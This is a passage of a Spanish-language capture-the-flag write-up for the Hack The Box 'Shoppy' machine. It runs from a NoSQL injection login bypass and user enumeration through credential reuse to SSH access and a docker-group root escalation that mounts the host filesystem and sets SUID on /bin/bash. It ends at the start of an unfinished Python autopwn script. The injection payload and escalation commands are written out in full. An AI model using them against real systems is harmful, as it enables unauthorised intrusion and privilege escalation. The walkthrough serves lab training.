Time-out</strong></p><p>De primeras este comportamiento es sospechoso, y al no darnos resultados pasamos a intentar <strong>Inyecciones NoSQL</strong> de las bases de datos NoSQL mas usadas, como por ejemplo <code class="language-plaintext highlighter-rouge">MongoDB</code></p><p><img data-src="/assets/img/htb/writeups/shoppy/mongo_sqli.png" alt="monog-SQLi" class="shadow" data-proofer-ignore></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">❯ mongo_inyection="' || 1==1%00";</span><span class="w"> </span>curl <span class="nt">-si</span> <span class="nt">-X</span> POST <span class="nt">-d</span> <span class="s2">"username=</span><span class="nv">$mongo_inyection</span><span class="s2">&amp;password="</span> http://shoppy.htb/login
<span class="go">HTTP/1.1 302 Found
Server: nginx/1.23.1
Date: Tue, 04 Oct 2022 22:33:04 GMT
</span><span class="gp">Content-Type: text/plain;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
<span class="go">Content-Length: 28
Connection: keep-alive
Location: /admin
Vary: Accept
</span><span class="gp">Set-Cookie: connect.sid=s%3Allicfo6nBCXrJUxRWtE1kDVYDFb_--rg.HNyc0WXYDLCGhx4xb%2F620KnAtbOwyJod13xbblHrbbw;</span><span class="w"> </span><span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
<span class="go">
Found. Redirecting to /admin
</span></pre></table></code></div></div><p>Lo que hacemos aqui es pasarle un nombre de usuario vacío seguido del operador lógico <strong>OR (||)</strong> y una declaración verdadera <strong>1==1</strong>, lo cuál permitira validar la consulta a pesar de pasar un usuario que no existe. Y por último un <strong>Null byte (%00)</strong> que tiene como rol único terminar el string para poder ignorar validaciones posteriores (en este caso ignorar la valiación del campo password)</p><blockquote class="prompt-info"><div><p>Aquí puedes encontrar mas información sobre maneras de evadir páginas de logeo <a href="https://book.hacktricks.xyz/pentesting-web/login-bypass">https://book.hacktricks.xyz/pentesting-web/login-bypass</a></p></div></blockquote><blockquote class="prompt-warning"><div><p>El problema que existe al logearnos ingresando la inyección es que la web codifica la data a <strong>URL</strong>, por ello recomiendo pasarlo por burpsuite para decodificarlo y enviarlo</p></div></blockquote><blockquote class="prompt-tip"><div><p>Sin embargo, en la web también puedes pasar una inyección con un usuario válido (el clásico admin por defecto) y agregando una comilla para cerrar el campo username original <code class="language-plaintext highlighter-rouge">admin' || '</code></p></div></blockquote><p>Logramos entrar a la web y observamos lo siguiente:</p><p><img data-src="/assets/img/htb/writeups/shoppy/shoppy_htb_admin_web.png" alt="shoppy-htb-admin-web" class="shadow" data-proofer-ignore></p><p>Llama la atención que podemos buscar usuarios, y probando usuarios clásicos conseguimos dar respuesta al buscar con el usuario <code class="language-plaintext highlighter-rouge">admin</code></p><p><img data-src="/assets/img/htb/writeups/shoppy/shoppy_htb_admin_search_admin.png" alt="shoppy-htb-admin-web-search" class="shadow" data-proofer-ignore></p><p>Al descargar la exportación nos muestra las credenciales del usuario <code class="language-plaintext highlighter-rouge">admin</code> en formato <code class="language-plaintext highlighter-rouge">json</code></p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"_id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"62db0e93d6d6a999a66ee67a"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"admin"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"23c6877d9e2b564ef8b32c3a23de27b2"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></table></code></div></div><p>Sin embargo no conseguimos crackearla, pero a pesar de eso tenemos una vía de <strong>enumerar más usuarios</strong>. Por ello usamos <code class="language-plaintext highlighter-rouge">wfuzz</code> y con un diccionario de nombres filtramos por las respuestas que contengan <strong>Download export</strong></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">❯ wfuzz -c -w /usr/share/SecLists/Usernames/Names/names.txt --ss 'Download export' -b 'connect.sid=s%3A-KBUXDEBlgxYGHsr_sTcAWrfSW17csU1.gTfrPHTEMAjVmXuy6kmZYUYSf5zd%2Bfi7agmkHzZPor4' http://shoppy.htb/admin/search-users?username=FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://shoppy.htb/admin/search-users?username=FUZZ
Total requests: 10177

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000086:   200        55 L     160 W      2720 Ch     "admin"                                                                                                    
000004909:   200        55 L     160 W      2720 Ch     "josh" &lt;-- New user!
</span></pre></table></code></div></div><p>Obtenemos otro archivo en formato <code class="language-plaintext highlighter-rouge">json</code> con credenciales del usuario <code class="language-plaintext highlighter-rouge">josh</code> (hash md5 por el formato), así que la crackeamos con una web muy conocida <a href="https://crackstation.net/">https://crackstation.net/</a></p><p><img data-src="/assets/img/htb/writeups/shoppy/josh_password_hash_crackstation.png" alt="josh-password-hash" class="shadow" data-proofer-ignore></p><p>Ahora tenemos las credenciales <code class="language-plaintext highlighter-rouge">josh:remembermethisway</code>, podemos intentar por <strong>SSH</strong> pero no conseguimos ingresar, solo son las credenciales para logearnos en donde ya estamos</p><p>Continuando con la enumeración ingresamos al puerto <strong>9093</strong> que nos sabemos a ciencia exacta que es</p><p><img data-src="/assets/img/htb/writeups/shoppy/shoppy_htb_port_9093.png" alt="shoppy.htb-port-9093" class="shadow" data-proofer-ignore></p><p>Observamos lo que parece ser <strong>logs</strong> que si actualizamos veremos que va cambiando. Además, de primera vista leemos <code class="language-plaintext highlighter-rouge">Go runtime</code> y <code class="language-plaintext highlighter-rouge">GC cycles</code> que se repite a menudo y la siguiente información que puede ser de ayuda</p><div class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="Text"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre># HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
...
# HELP go_info Information about the Go environment.
# TYPE go_info gauge
go_info{version="go1.18.1"} 1
...
playbooks_plugin_system_playbook_instance_info{Version="1.29.1"} 1
</pre></table></code></div></div><p>Investigando encontramos la relación del lenguaje <code class="language-plaintext highlighter-rouge">Go</code> con <code class="language-plaintext highlighter-rouge">GC</code> (Gargabe Collector), el cuál es un sistema que ayuda a gestionar la memoria de una aplicación identificado partes de la memoria que ya no son necesarias. Y por último, muestran el termino <code class="language-plaintext highlighter-rouge">playbooks_plugin_system</code> y su version respectiva</p><p>Entonces relacionando los términos <code class="language-plaintext highlighter-rouge">Go enviroment</code> y <code class="language-plaintext highlighter-rouge">playbooks plugin</code> encontramos el siguiente repositorio:</p><p><img data-src="/assets/img/htb/writeups/shoppy/mattermost_playbooks_repository.png" alt="mattermost-playbook-repository" class="shadow" data-proofer-ignore></p><p>Buscando sobre <strong>Mattermost</strong> encontramos que es una plataforma de mensajería instantánea segura y colaborativa para organizaciones y compañias. Además, tiene una aplicación web y probablemente lo que vemos en el puerto <code class="language-plaintext highlighter-rouge">9093</code> tiene relación con la misma</p><p>Pero pensando un poco más podemos deducir que probableme tengamos acceso para la aplicación. Para ello podemos recordar el concepto de <code class="language-plaintext highlighter-rouge">subdominios</code> que nos sirve para organizar diversas secciones de nuestra web (shoppy.htb) y funcionen de manera independiente. Así que probando el subdominio <code class="language-plaintext highlighter-rouge">mattermost.shoppy.htb</code> y aplicando el concepto del principio de <strong>Virtual Hosting</strong> obtenemos la siguiente paǵina:</p><p><img data-src="/assets/img/htb/writeups/shoppy/mattermost_shoppy_htb_login.png" alt="mattermost-shoppy.htb-login" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Si no llegamos a la conclusión anterior tambien podemos <strong>Fuzzear</strong> en algunos diccionarios</p></div></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>❯ <span class="k">for </span>i <span class="k">in</span> /usr/share/SecLists/Discovery/DNS/<span class="k">*</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$i</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">grep</span> <span class="nt">-n</span> <span class="nt">-e</span> <span class="s1">'^mattermost$'</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
/usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt

47340:mattermost
/usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top500.txt

/usr/share/SecLists/Discovery/DNS/deepmagic.com-prefixes-top50000.txt

/usr/share/SecLists/Discovery/DNS/dns-Jhaddix.txt

923243:mattermost
/usr/share/SecLists/Discovery/DNS/fierce-hostlist.txt

/usr/share/SecLists/Discovery/DNS/italian-subdomains.txt

/usr/share/SecLists/Discovery/DNS/namelist.txt

82865:mattermost
/usr/share/SecLists/Discovery/DNS/shubs-stackoverflow.txt

/usr/share/SecLists/Discovery/DNS/shubs-subdomains.txt

/usr/share/SecLists/Discovery/DNS/sortedcombined-knock-dnsrecon-fierce-reconng.txt

/usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

/usr/share/SecLists/Discovery/DNS/subdomains-top1million-20000.txt

/usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt

</pre></table></code></div></div><p>Observamos un panel de logeo e intentamos usar las credenciales que conseguimos anteriormente <code class="language-plaintext highlighter-rouge">josh:remembermethisway</code>, nos logeamos y entramos a la aplicación <strong>Mattermost</strong>:</p><p><img data-src="/assets/img/htb/writeups/shoppy/mattermost_shoppy_htb_mattermost_App.png" alt="mattermost-shoppy.htb-mattermost" class="shadow" data-proofer-ignore></p><p>Empezando rápidamente a revisar las funcionalidades de la página encontramos en la sección de menciones un mensaje justamente del usuario que enumeramos al principio <code class="language-plaintext highlighter-rouge">jaeger</code> con lo siguiente:</p><p><img data-src="/assets/img/htb/writeups/shoppy/mattermost_shoppy_htb_leakage.png" alt="mattermost_shoppt_htb_leakage_information" class="shadow" data-proofer-ignore></p><p>Debido a <strong>filtración de información</strong> obtenemos las credenciales <code class="language-plaintext highlighter-rouge">jaeger:Sh0ppyBest@pp!</code>, y como sabemos que el usuario es parte del sistema las usamos para entrar por <strong>SSH</strong> y conseguir la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="go">❯ sshpass -p 'Sh0ppyBest@pp!' ssh jaeger@10.10.11.180
</span><span class="gp">Linux shoppy 5.10.0-18-amd64 #</span>1 SMP Debian 5.10.140-1 <span class="o">(</span>2022-09-02<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Oct  4 22:17:12 2022 from 10.10.14.99
</span><span class="gp">jaeger@shoppy:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> + 2&gt;/dev/null
<span class="go">-rw-r----- 1 root jaeger 33 Oct  4 21:53 /home/jaeger/user.txt
</span></pre></table></code></div></div><p>Ya que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores:</p><blockquote><p>NoSQL Injection (file:/home/jaeger/ShoppyApp/index.js:)</p></blockquote><p>Observamos en la linea <code class="language-plaintext highlighter-rouge">10</code> que tanto el usuario como la contraseña de insertan dentro de la <code class="language-plaintext highlighter-rouge">query</code> sin aplicar algún filtro:</p><div class="language-javascript highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="p">...</span>
<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login</span><span class="dl">'</span><span class="p">,</span> <span class="k">async</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>                                                                                                                      
    <span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>                                        
    <span class="kd">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">;</span>                          
    <span class="k">if</span> <span class="p">(</span><span class="nx">username</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">password</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>                                                                                                   
        <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">400</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">'</span><span class="s1">Bad Request</span><span class="dl">'</span><span class="p">);</span>
        <span class="k">return</span><span class="p">;</span>                                                                                                                                               
    <span class="p">}</span>                                                                                                                                                         
    <span class="kd">const</span> <span class="nx">passToTest</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">crypto</span><span class="dl">'</span><span class="p">).</span><span class="nx">createHash</span><span class="p">(</span><span class="dl">'</span><span class="s1">md5</span><span class="dl">'</span><span class="p">).</span><span class="nx">update</span><span class="p">(</span><span class="nx">password</span><span class="p">).</span><span class="nx">digest</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">);</span>
    <span class="kd">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="p">{</span> <span class="na">$where</span><span class="p">:</span> <span class="s2">`this.username === '</span><span class="p">${</span><span class="nx">username</span><span class="p">}</span><span class="s2">' &amp;&amp; this.password === '</span><span class="p">${</span><span class="nx">passToTest</span><span class="p">}</span><span class="s2">'`</span> <span class="p">};</span>
    <span class="kd">const</span> <span class="nx">result</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="nx">query</span><span class="p">).</span><span class="nx">maxTimeMS</span><span class="p">(</span><span class="mi">350</span><span class="p">);</span>                      
    <span class="k">if</span> <span class="p">(</span><span class="nx">result</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>                                                 
        <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login?error=WrongCredentials</span><span class="dl">'</span><span class="p">);</span>                         
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>                         
        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">username</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">;</span>                                                                                                             
        <span class="nx">req</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">save</span><span class="p">((</span><span class="nx">error</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>                                                                                                                         
            <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>                                                       
                <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/login?error=WrongCredentials</span><span class="dl">'</span><span class="p">);</span>
            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>                                                           
                <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">'</span><span class="s1">/admin</span><span class="dl">'</span><span class="p">);</span> 
            <span class="p">}</span>                                                                  
        <span class="p">});</span>                                                                    
    <span class="p">}</span>                                                                                                                                                   <span class="p">})</span>
<span class="p">...</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Aquí tienes un claro ejemplo de <strong>Inyección NoSQL con Mongo</strong> <a href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p></div></blockquote><blockquote class="prompt-tip"><div><p>Revisando los canales de la web <strong>Mattermost</strong> podemos encontrar comentarios que dan una pista para la <strong>Escalada de privilegios</strong></p></div></blockquote><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Después de una enumeración básica del sistema encontramos que tenemos los permisos como usuario <code class="language-plaintext highlighter-rouge">deploy</code> para ejecutar el comando <code class="language-plaintext highlighter-rouge">/home/deploy/password-manager</code></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">jaeger@shoppy:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
</span></pre></table></code></div></div><p>Al ejecutarlo nos pide la <strong>master password</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">jaeger@shoppy:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/password-manager
<span class="go">Welcome to Josh password manager!
Please enter your master password: idontknowpassword            
Access denied! This incident will be reported !
</span></pre></table></code></div></div><p>Ya que tenemos permisos para descargarlo lo traemos a nuestra máquina para analizarlo y aplicar <strong>Ingeniería Inversa</strong> con <code class="language-plaintext highlighter-rouge">ghidra</code>:</p><p><img data-src="/assets/img/htb/writeups/shoppy/password_manager_ghidra.png" alt="password-manager-ghidra" class="shadow" data-proofer-ignore></p><p>Observamos que nuestro input se guarda en la variable <code class="language-plaintext highlighter-rouge">local_48</code> y luego se inserta en la variable <code class="language-plaintext highlighter-rouge">local_68</code> la palabra <strong>Sample</strong> que luego se compara con nuestro input y si son iguales devolverá el número ‘0’ y nos mostrará el archivo <em>/home/deploy/creds.txt</em>. Entonces ingresamos esa palabra y conseguimos las credenciales del usuario <code class="language-plaintext highlighter-rouge">deploy</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">jaeger@shoppy:/home/deploy$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> deploy /home/deploy/password-manager
<span class="go">Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
</span></pre></table></code></div></div><p>Como el usuario <code class="language-plaintext highlighter-rouge">deploy</code> observamos que pertenecemos al grupo <code class="language-plaintext highlighter-rouge">docker</code>, lo cuál de alguna manera nos permite obtener privilegios ya que sabemos que <code class="language-plaintext highlighter-rouge">docker</code> <strong>requiere permisos de root</strong> para su ejecución</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="gp">deploy@shoppy:~$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
</span><span class="gp">deploy@shoppy:~$</span><span class="w"> </span>find / <span class="nt">-group</span> docker 2&gt;/dev/null | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">srw-rw---- 1 root docker 0 Oct  5 00:01 /run/docker.sock
</span></pre></table></code></div></div><p>Usamos <code class="language-plaintext highlighter-rouge">docker ps</code> para ver las imágenes que tenemos disponibles y crear un contenedor observamos que nos encontramos como usuario <code class="language-plaintext highlighter-rouge">root</code>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">deploy@shoppy:~$</span><span class="w"> </span>docker run <span class="nt">-it</span> alpine
<span class="gp">/ #</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">/ #</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="go">.           .dockerenv  dev         home        media       opt         root        sbin        sys         usr
..          bin         etc         lib         mnt         proc        run         srv         tmp         var
</span></pre></table></code></div></div><p>Revisando la IP y viendo el archivo <em>.dockerenv</em> sabemos que nos es la máquina original. Pero con solo saber que estamos dentro como <code class="language-plaintext highlighter-rouge">root</code> ya podemos escalar privilegios en la máquina principal</p><p>Entonces lo que podemos hacer es crear un contenedor con la imagen que tenemos, montar todo el sistema de archivos de la <strong>máquina host (10.10.11.180)</strong> a nuestro <strong>contenedor (172.17.0.2)</strong> y ya que somos <code class="language-plaintext highlighter-rouge">root</code> podremos usar todos esos archivos y binarios como si estuvieramos en la misma máquina host:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">deploy@shoppy:~$</span><span class="w"> </span>docker run <span class="nt">-it</span> <span class="nt">-v</span> /:/tmp <span class="nt">--rm</span> alpine <span class="nb">chroot</span> /tmp bash
<span class="gp">root@15d0b34856d2:/#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">root@15d0b34856d2:/#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-a</span>
<span class="go">.   .cache  boot  etc   initrd.img      lib    lib64   lost+found  mnt  proc  run   srv  tmp  var      vmlinuz.old
..  bin     dev   home  initrd.img.old  lib32  libx32  media       opt  root  sbin  sys  usr  vmlinuz
</span></pre></table></code></div></div><p>Para un accesso persistente podríamos asignarle permisos <strong>SUID</strong> al binario <code class="language-plaintext highlighter-rouge">/bin/bash</code> para poder ejecutarlo como el propietario y conseguir la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="gp">deploy@shoppy:~$</span><span class="w"> </span>docker run <span class="nt">-it</span> <span class="nt">-v</span> /:/tmp <span class="nt">--rm</span> alpine <span class="nb">chroot</span> /tmp bash
<span class="gp">root@f5a544f92c52:/#</span><span class="w"> </span><span class="nb">chmod </span>u+s /bin/bash
<span class="gp">root@f5a544f92c52:/#</span><span class="w"> </span><span class="nb">exit</span>
<span class="go">exit
</span><span class="gp">deploy@shoppy:~$</span><span class="w"> </span>bash <span class="nt">-p</span>
<span class="gp">bash-5.1#</span><span class="w"> </span><span class="nb">whoami</span>
<span class="go">root
</span><span class="gp">bash-5.1#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">-rw-r----- 1 root root 33 Oct  5 00:01 /root/root.txt
</span></pre></table></code></div></div><blockquote class="prompt-warning"><div><p>Ya saben, no asignemos el grupo <code class="language-plaintext highlighter-rouge">docker</code> a cualquier usuario ya que existen varias maneras de escalar privilegios</p></div></blockquote><blockquote class="prompt-info"><div><p>Para un análisis mas a fondo y todo tipo de cosas que puedas hacer respecto al <strong>UNIX socket (docker.sock)</strong> recomiendo este articulo <a href="https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html">https://blog.quarkslab.com/why-is-exposing-the-docker-socket-a-really-bad-idea.html</a></p></div></blockquote><p>Para finalizar y como es costumbre hice un <strong>autopwn</strong> en <code class="language-plaintext highlighter-rouge">python</code> aplicando todos los conceptos vistos:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">paramiko</span>		 <span class="c1"># pip install paramiko
</span><span class="kn">import</span> <span class="nn">requests</span> 	 <span class="c1"># pip install requests
</span><span class="kn">import</span> <span class="nn">shlex</span>		 
<span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">import</span> <span class="nn">subprocess</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span> 	 <span class="c1"># pip install pwntools
</span>
<span class="s">""" 
Autopwn Shoppy HTB Machine
--------------------------
Author: Marss
Date: Sep 30, 2022 
"""</span>

<span class="c1"># Variables
</span><span class="n">target_host</span> <span class="o">=</span> <span class="s">'10.10.11.180'</span>
<span class="n">wordlist_filename</span> <span class="o">=</span> <span class="s">'rockyou.txt'</span>

